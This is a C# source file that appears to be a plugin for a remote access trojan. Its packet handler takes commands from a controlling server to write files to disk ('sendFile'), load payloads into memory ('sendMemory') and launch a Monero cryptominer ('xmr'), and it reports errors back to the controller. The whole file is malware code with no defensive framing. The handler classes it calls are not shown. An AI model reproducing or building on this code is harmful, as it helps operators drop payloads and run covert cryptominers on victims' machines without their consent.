﻿using Plugin.Handler;
using Plugin.MessagePack;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendFile":
                        {
                            new HandleSendTo().SendToDisk(unpack_msgpack);
                            break;
                        }

                    case "sendMemory":
                        {
                            new HandleSendTo().SendToMemory(unpack_msgpack);
                            break;
                        }

                    case "xmr":
                        {
                            new HandleMiner(unpack_msgpack);
                            break;
                        }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
            Connection.Disconnected();
        }

        public static void Error(string ex)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }
    }

}